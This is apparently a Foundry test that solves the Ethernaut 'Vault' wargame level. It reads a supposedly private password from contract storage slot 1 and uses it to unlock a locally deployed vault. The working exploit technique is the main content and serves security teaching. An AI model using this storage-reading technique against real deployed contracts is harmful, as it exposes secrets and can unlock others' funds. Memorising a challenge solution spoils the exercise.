// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Vault} from "../src/08_Vault.sol";

/// @title Ethernaut 08 - Vault Solution Test
/// @notice Verifies that a private storage value can be read and submitted to unlock the target.
contract VaultTest is Test {
    /// @notice Vault instance under test.
    Vault target;

    /// @notice Account used to solve the level.
    address player = makeAddr("player");

    /// @notice Password used to create the local challenge instance.
    bytes32 constant PASSWORD = "password";

    /// @notice Deploys a fresh locked vault before each test.
    function setUp() public {
        target = new Vault(PASSWORD);
    }

    /// @notice Reads storage slot 1 and uses the recovered value to unlock the vault.
    function testSolve() public {
        assertTrue(target.locked());

        bytes32 slot1Data = vm.load(address(target), bytes32(uint256(1)));
        assertEq(slot1Data, PASSWORD);

        vm.prank(player);
        target.unlock(slot1Data);

        assertFalse(target.locked());
    }
}
